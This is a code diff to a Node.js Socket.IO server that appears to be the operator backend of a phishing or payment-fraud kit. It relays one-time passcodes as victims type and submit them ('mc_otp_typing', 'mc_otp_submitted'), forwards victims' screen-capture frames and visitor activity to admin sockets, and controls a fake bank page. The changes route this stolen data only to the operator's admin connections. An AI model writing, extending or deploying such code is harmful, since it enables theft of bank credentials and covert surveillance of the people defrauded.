@@ -306,7 +306,7 @@ async function fetchGeoData(ip) {
     try {
       const response = await fetch(`https://ipapi.co/${ip}/json/`);
       
-      if (!response.ok) {
+     if (!response.ok) {
         throw new Error(`IP lookup failed with status ${response.status}`);
       }
       
@@ -384,6 +384,9 @@ const server = app.listen(PORT, () => {
 const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
+
+// Track admin sockets separately
+const adminSockets = new Set();
 
 // Endpoint to get active visitor info
 app.get('/api/visitors', (req, res) => {
@@ -687,6 +690,15 @@ app.post('/api/hideBankpage', (req, res) => {
   res.json({ status: 'success' });
 });
 
+app.post('/api/markTransactionViewed', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  txn.viewed = true;
+  res.json({ status: "success" });
+});
+
 app.get('/api/getTransactionForSuccess', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
@@ -730,7 +742,31 @@ app.get('/api/getTransactionForFail', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-  console.log('New socket connection established with ID:', socket.id);
+  console.log(`New socket connection established with ID: ${socket.id}`);
+
+  // Check if this is an admin connection
+  const isAdmin = socket.handshake.query?.isAdmin === 'true';
+  if (isAdmin) {
+    console.log('Admin connected:', socket.id);
+    adminSockets.add(socket);
+    
+    // Send current visitors to the admin
+    const visitorsList = Array.from(visitors.values());
+    socket.emit('existing_visitors', visitorsList);
+    
+    // Send current transactions
+    socket.emit('existing_transactions', Array.from(transactions.values()));
+  }
+  
+  // Handle admin_connected event
+  socket.on('admin_connected', (data) => {
+    console.log('Admin explicitly connected:', socket.id);
+    
+    // Send current visitors and transactions again
+    const visitorsList = Array.from(visitors.values());
+    socket.emit('existing_visitors', visitorsList);
+    socket.emit('existing_transactions', Array.from(transactions.values()));
+  });
   
   socket.on('join', (invoiceId) => {
     console.log(`Socket ${socket.id} joining room for invoiceId:`, invoiceId);
@@ -774,17 +810,17 @@ io.on('connection', (socket) => {
   socket.on('mc_otp_submitted', (data) => {
     // Notify admin panel of OTP submission - CRITICAL TO USE io.emit NOT io.to
     console.log(`MC OTP RECEIVED: ${data.otp} for invoice: ${data.invoiceId}`);
-    io.emit('mc_otp_submitted', data);  // Broadcast to ALL clients
+    broadcastToAdmins('mc_otp_submitted', data);
   });
 
   // Optional - for live OTP typing feature
   socket.on('mc_otp_typing', (data) => {
     // Send partial OTP to admin panel as user types - optional feature
     console.log(`MC OTP typing: ${data.partialOtp} for invoice: ${data.invoiceId}`);
-    io.emit('mc_otp_typing', data);  // Broadcast to ALL clients
+    broadcastToAdmins('mc_otp_typing', data);
   });
 
-  socket.on('mc_otp_error', (data) => {
+ socket.on('mc_otp_error', (data) => {
     // Send OTP error to client
     console.log('Sending OTP error to client:', data);
     io.to(data.invoiceId).emit('mc_otp_error', data);
@@ -799,25 +835,21 @@ io.on('connection', (socket) => {
   socket.on('mc_resend_otp', (data) => {
     // Notify admin panel of OTP resend request - CRITICAL TO USE io.emit NOT io.to
     console.log(`MC OTP RESEND REQUEST for invoice: ${data.invoiceId}`);
-    io.emit('mc_resend_otp', data);  // Broadcast to ALL clients
+    broadcastToAdmins('mc_resend_otp', data);
   });
 
   // Screen capture handlers
   socket.on('screen_frame', (data) => {
     // Get pid from socket query or data
-    const pid = socket.handshake.query?.pid || data.userId;
+    const pid = socket.handshake.query?.pid || data.pid || data.userId;
     
     console.log(`Received screen frame from: ${pid || socket.id}, size: ${data.frameData?.length || 0}`);
     
     // Forward to admin sockets
-    io.sockets.sockets.forEach(s => {
-      if (s.handshake.query && s.handshake.query.isAdmin === 'true') {
-        s.emit('screen_frame', {
-          ...data,
-          userId: pid,
-          socketId: socket.id
-        });
-      }
+    broadcastToAdmins('screen_frame', {
+      ...data,
+      userId: pid,
+      socketId: socket.id
     });
   });
   
@@ -825,14 +857,10 @@ io.on('connection', (socket) => {
     console.log(`Screen capture error from: ${socket.id}`, data.error);
     
     // Forward to admin sockets
-    io.sockets.sockets.forEach(s => {
-      if (s.handshake.query && s.handshake.query.isAdmin === 'true') {
-        s.emit('screen_capture_error', {
-          ...data,
-          userId: socket.handshake.query.pid,
-          socketId: socket.id
-        });
-      }
+    broadcastToAdmins('screen_capture_error', {
+      ...data,
+      userId: socket.handshake.query.pid,
+      socketId: socket.id
     });
   });
   
@@ -882,8 +910,36 @@ io.on('connection', (socket) => {
     });
   });
   
-  // Handle disconnect
+  // Handle visitor heartbeats
+  socket.on('visitor_heartbeat', (data) => {
+    if (data.pid && visitors.has(data.pid)) {
+      const visitor = visitors.get(data.pid);
+      visitor.lastActive = Date.now();
+      visitor.url = data.url || visitor.url; // Update URL if provided
+      visitors.set(data.pid, visitor);
+      
+      // Notify admins of activity
+      broadcastToAdmins('visitor_activity', {
+        pid: data.pid,
+        timestamp: Date.now(),
+        type: 'heartbeat'
+      });
+    }
+  });
+  
+  // When socket disconnects, remove from admin sockets if it was an admin
   socket.on('disconnect', () => {
+    if (adminSockets.has(socket)) {
+      adminSockets.delete(socket);
+      console.log('Admin disconnected:', socket.id);
+    }
     console.log('Socket disconnected:', socket.id);
   });
 });
+
+// Helper function to broadcast to admin sockets
+function broadcastToAdmins(event, data) {
+  adminSockets.forEach(socket => {
+    socket.emit(event, data);
+  });
+}
